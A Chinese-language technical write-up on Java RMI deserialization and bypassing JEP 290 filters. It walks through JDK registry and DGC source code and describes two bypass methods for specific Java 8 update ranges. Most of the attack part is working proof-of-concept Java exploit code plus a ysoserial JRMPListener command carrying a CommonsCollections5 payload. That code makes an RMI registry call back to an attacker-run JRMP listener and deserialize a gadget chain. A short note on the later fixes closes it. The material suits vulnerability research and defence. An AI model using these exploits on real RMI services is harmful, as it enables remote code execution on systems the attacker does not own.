@@ -1,0 +1,281 @@
+            throws RemoteException
+        {
+            this(port, csf, ssf, RegistryImpl::registryFilter);
+        }
+在RegistryImpl生成的时候就传递给UnicastServerRef2
+    public RegistryImpl(int port,
+                            RMIClientSocketFactory csf,
+                            RMIServerSocketFactory ssf,
+                            ObjectInputFilter serialFilter)
+            throws RemoteException
+        {
+            if (port == Registry.REGISTRY_PORT && System.getSecurityManager() != null) {
+                // grant permission for default port only.
+                try {
+                    AccessController.doPrivileged(new PrivilegedExceptionAction() {
+                        public Void run() throws RemoteException {
+                            LiveRef lref = new LiveRef(id, port, csf, ssf);
+                            setup(new UnicastServerRef2(lref, serialFilter));
+                            return null;
+                        }
+                    }, null, new SocketPermission("localhost:"+port, "listen,accept"));
+                } catch (PrivilegedActionException pae) {
+                    throw (RemoteException)pae.getException();
+                }
+            } else {
+                LiveRef lref = new LiveRef(id, port, csf, ssf);
+                setup(new UnicastServerRef2(lref, serialFilter));
+            }
+        }
+    -------------------------》
+        public UnicastServerRef2(LiveRef ref,
+                                 ObjectInputFilter filter)
+        {
+            super(ref, filter);
+        }
+    ----------------------》
+        public UnicastServerRef(LiveRef ref, ObjectInputFilter filter) {
+            super(ref);
+            this.filter = filter;
+        }
+在创建时后一直作为UnicastServerRef的变量，在进行处理的时候才传递给ObjectInputStream。
+查看ObjectInputStream#filterCheck
+    private void filterCheck(Class clazz, int arrayLength)
+                throws InvalidClassException {
+            if (serialFilter != null) {
+                RuntimeException ex = null;
+                ObjectInputFilter.Status status;
+                // Info about the stream is not available if overridden by subclass, return 0
+                long bytesRead = (bin == null) ? 0 : bin.getBytesRead();
+                try {
+                    status = serialFilter.checkInput(new FilterValues(clazz, arrayLength,
+                            totalObjectRefs, depth, bytesRead));
+这里的serialFilter就是RegistryImpl$$Lambda。所以最终会执行到RegistryImpl#registryFilter
+### 为什么服务端和客户端相互攻击不会被拦截
+JEP290是需要我们手动设置的。
+在攻击注册端时会被拦截是因为需要传输RegistryImpl对象，这样才能执行到dispatch分支，因为RegistryImpl中主动设置了（RegistryImpl::registryFilter），传输的RegistryImpl对象就有filter。
+但是在客户端和服务端相互传输的数据是由UnicastServerRef对象包装。可以看前面的服务端接收数据，filter为null。
+### RMI中绕过
+#### 方式一：利用DGC开启JRMP
+适用版本：8u121-8u230
+利用过程
+  1. 开启服务端
+    package org.payload.rmi.rmiServer;
+    import java.rmi.Naming;
+    import java.rmi.registry.LocateRegistry;
+    import java.rmi.registry.Registry;
+    public class RMIServer {
+        private void start() throws Exception {
+            Service h = new Service();
+            Registry registry = LocateRegistry.createRegistry(1091);
+            Naming.bind("rmi://127.0.0.1:1091/Hello", h);
+        }
+        public static void main(String[] args) throws Exception {
+            new RMIServer().start();
+        }
+    }
+  1. ysoserial开启恶意JRMPListener：`java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1234 CommonsCollections5 "calc.exe"`
+  2. 向注册端方发送恶意的ip port
+    package org.payload.rmi.rmiRegistry.ToRegistry;
+    import sun.rmi.server.UnicastRef;
+    import sun.rmi.transport.LiveRef;
+    import sun.rmi.transport.tcp.TCPEndpoint;
+    import java.lang.reflect.Proxy;
+    import java.rmi.registry.LocateRegistry;
+    import java.rmi.registry.Registry;
+    import java.rmi.server.ObjID;
+    import java.rmi.server.RemoteObjectInvocationHandler;
+    import java.util.Random;
+    public class JRMPToRegistry {
+        public static void main(String[] args) throws Exception {
+            Registry reg = LocateRegistry.getRegistry("127.0.0.1",1091);
+            ObjID id = new ObjID(new Random().nextInt());
+            TCPEndpoint te = new TCPEndpoint("127.0.0.1", 1234);
+            UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
+            RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
+            Registry proxy = (Registry) Proxy.newProxyInstance(Registry.class.getClassLoader(), new Class[] {
+                    Registry.class
+            }, obj);
+            reg.bind("test12",proxy);
+        }
+    }
+  1. 注册端连接ysoserial开启的JRMPListener，ysoserial发送恶意数据。
+##### UnicastRef
+RMI中的过滤器只允许白名单中的类通过，那么我们只需要找一个白名单中的类，利用它的readObject即可
+服务端客户端与Registry通信都需要UnicastRef，如果我们能控制UnicastRef中的host、port就可以传输恶意的数据（ip
+port）。
+##### RemoteObject
+通过UnicastRef我们可以控制一些数据，但是我们还需要一个readObject来执行连接操作，RemoteObject继承了Remote 和
+Serializable 接口，可以通过filter。
+查看其readObject方法
+    private void readObject(ObjectInputStream var1) throws IOException,ClassNotFoundException {
+            String var2 = var1.readUTF();
+            if (var2 != null && var2.length() != 0) {
+                String var3 = "sun.rmi.server." + var2;
+                Class var4 = Class.forName(var3);
+                try {
+                    this.ref = (RemoteRef)var4.newInstance();
+    .....
+                this.ref.readExternal(var1);
+            } else {
+                this.ref = (RemoteRef)var1.readObject();}}
+    --------------------》
+              public void readExternal(ObjectInput var1) throws IOException, ClassNotFoundException {
+            this.ref = LiveRef.read(var1, false);
+        }
+    ---------------------》
+              public static LiveRef read(ObjectInput var0, boolean var1) throws IOException, ClassNotFoundException {
+            TCPEndpoint var2;
+            if (var1) {
+                var2 = TCPEndpoint.read(var0);
+            } else {
+                var2 = TCPEndpoint.readHostPortFormat(var0);
+            }
+            ObjID var3 = ObjID.read(var0);
+            boolean var4 = var0.readBoolean();
+            LiveRef var5 = new LiveRef(var3, var2, false);
+            if (var0 instanceof ConnectionInputStream) {
+                ConnectionInputStream var6 = (ConnectionInputStream)var0;
+                var6.saveRef(var5);
+    --------------------------》
+                  void saveRef(LiveRef var1) {
+            Endpoint var2 = var1.getEndpoint();
+            Object var3 = (List)this.incomingRefTable.get(var2);
+            if (var3 == null) {
+                var3 = new ArrayList();
+                this.incomingRefTable.put(var2, var3);
+            }
+            ((List)var3).add(var1);
+        }
+read方法会读取ip host然后传入saveRef重新封装，为的是在调用DGCClient#registerRefs时使用。
+上面的readObject方法是在`RegistryImpl_Skel`case中进行的
+    case 0:
+                    RegistryImpl.checkAccess("Registry.bind");
+                    try {
+                        var9 = var2.getInputStream();
+                        var7 = (String)var9.readObject();
+                        var80 = (Remote)var9.readObject();
+                    } catch (ClassNotFoundException | IOException var77) {
+                        throw new UnmarshalException("error unmarshalling arguments", var77);
+                    } finally {
+                        var2.releaseInputStream();
+                    }
+                    var6.bind(var7, var80);
+执行完readObject后到`var2.releaseInputStream();`
+    public void releaseInputStream() throws IOException {
+            try {
+                if (this.in != null) {
+                    try {
+                        this.in.done();
+                    } catch (RuntimeException var5) {
+                    }
+                    this.in.registerRefs();
+                    this.in.done(this.conn);
+                }
+                this.conn.releaseInputStream();
+            } finally {
+                this.in = null;}}
+然后执行registerRefs()
+    void registerRefs() throws IOException {
+            if (!this.incomingRefTable.isEmpty()) {
+                Iterator var1 = this.incomingRefTable.entrySet().iterator();
+                while(var1.hasNext()) {
+                    Entry var2 = (Entry)var1.next();
+                    DGCClient.registerRefs((Endpoint)var2.getKey(), (List)var2.getValue());
+                }}}
+    发起lookup连接
+        static void registerRefs(Endpoint var0, List var1) {
+            DGCClient.EndpointEntry var2;
+            do {
+                var2 = DGCClient.EndpointEntry.lookup(var0);
+            } while(!var2.registerRefs(var1));
+        }
+`this.incomingRefTable`就是一个HashMap，就是在前面的saveRef赋值的，里面有传入的恶意JRMP的ip
+port，然后由DGCClient向恶意的JRMP发起连接。
+此时我们的RMI注册端就变成了JRMP客户端，但是最终要这么利用嘞
+向恶意JRMP服务器发起dirty请求
+执行super.ref.invoke(var5)发送数据和处理接收的数据，
+咋executeCall()中执行readObject()，这里是处理服务端发送过来的消息。ysoserial将报错信息改为payload，因为要更改报错信息所以需要自己实现一个服务端。
+##### 使用lookup
+对于lookup也是可以实现攻击的，虽然只能传入String类型，但是对比起bind、rebind、unbind需要验证ip，lookup就不需要验证ip，只需要修改一下传输数据或者重新实现lookup的代码逻辑就能使用。
+修改数据：
+重新实现lookup：
+##### 修复
+  1. sun.rmi.registry.RegistryImpl_Skel#dispatch报错情况消除ref
+  2. sun.rmi.transport.DGCImpl_Stub#dirty提前了黑名单
+  3.     1. 虽然能够连接成功，但是CC链也被过滤了
+#### 方式二
+适用版本：8u231-8u240
+直接利用了UnicastRemoteObject的readObject然后一路执行到TCPTransport#listen，在TcpEndpoint#newServerSocket，触发动态代理（RemoteObjectInvocationHandler
+代理的RMIServerSocketFactory接口）
+    ServerSocket newServerSocket() throws IOException {
+            if (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) {
+                TCPTransport.tcpLog.log(Log.VERBOSE, "creating server socket on " + this);
+            }
+            Object var1 = this.ssf;
+            if (var1 == null) {
+                var1 = chooseFactory();
+            }
+            ServerSocket var2 = ((RMIServerSocketFactory)var1).createServerSocket(this.listenPort);
+到RMIServerSocketFactory#invoke->RemoteObjectInvocationHandler#invokeRemoteMethod->UnicastRef#invoke
+然后就建立JRMP连接，反序列化ysoserial的数据
+在bind或咋rebind的时候在MarshalOutputStream#replaceObject方法，如果对象没有继承RemoteStub，那么UnicastRemoteObject
+会被转化成 RemoteObjectInvocationHandler，我们可以利用反射修改enableReplace为false。
+poc
+    package org.payload.rmi.bypassJEP290;
+    import sun.rmi.registry.RegistryImpl_Stub;
+    import sun.rmi.server.UnicastRef;
+    import sun.rmi.transport.LiveRef;
+    import sun.rmi.transport.tcp.TCPEndpoint;
+    import java.io.ObjectOutput;
+    import java.io.ObjectOutputStream;
+    import java.lang.reflect.*;
+    import java.lang.reflect.Proxy;
+    import java.rmi.Remote;
+    import java.rmi.registry.*;
+    import java.rmi.server.*;
+    import java.util.Random;
+    public class Client2 {
+        public static void main(String[] args) throws Exception {
+            UnicastRemoteObject payload = getPayload();
+            Registry registry = LocateRegistry.getRegistry(1091);
+            bindReflection("pwn", payload, registry);
+        }
+        static UnicastRemoteObject getPayload() throws Exception {
+            ObjID id = new ObjID(new Random().nextInt());
+            TCPEndpoint te = new TCPEndpoint("127.0.0.1", 1234);
+            UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
+            System.getProperties().put("sun.misc.ProxyGenerator.saveGeneratedFiles", "true");
+            RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler(ref);
+            RMIServerSocketFactory factory = (RMIServerSocketFactory) Proxy.newProxyInstance(
+                    handler.getClass().getClassLoader(),
+                    new Class[]{RMIServerSocketFactory.class, Remote.class},
+                    handler
+            );
+            Constructor constructor = UnicastRemoteObject.class.getDeclaredConstructor();
+            constructor.setAccessible(true);
+            UnicastRemoteObject unicastRemoteObject = constructor.newInstance();
+            Field field_ssf = UnicastRemoteObject.class.getDeclaredField("ssf");
+            field_ssf.setAccessible(true);
+            field_ssf.set(unicastRemoteObject, factory);
+            return unicastRemoteObject;
+        }
+        static void bindReflection(String name, Object obj, Registry registry) throws Exception {
+            Field ref_filed = RemoteObject.class.getDeclaredField("ref");
+            ref_filed.setAccessible(true);
+            UnicastRef ref = (UnicastRef) ref_filed.get(registry);
+            Field operations_filed = RegistryImpl_Stub.class.getDeclaredField("operations");
+            operations_filed.setAccessible(true);
+            Operation[] operations = (Operation[]) operations_filed.get(registry);
+            RemoteCall remoteCall = ref.newCall((RemoteObject) registry, operations, 0, 4905912898345647071L);
+            ObjectOutput outputStream = remoteCall.getOutputStream();
+            Field enableReplace_filed = ObjectOutputStream.class.getDeclaredField("enableReplace");
+            enableReplace_filed.setAccessible(true);
+            enableReplace_filed.setBoolean(outputStream, false);
+            outputStream.writeObject(name);
+            outputStream.writeObject(obj);
+            ref.invoke(remoteCall);
+            ref.done(remoteCall);
+        }
+    }
+8u241之后对RMI反序列化攻击就基本无了
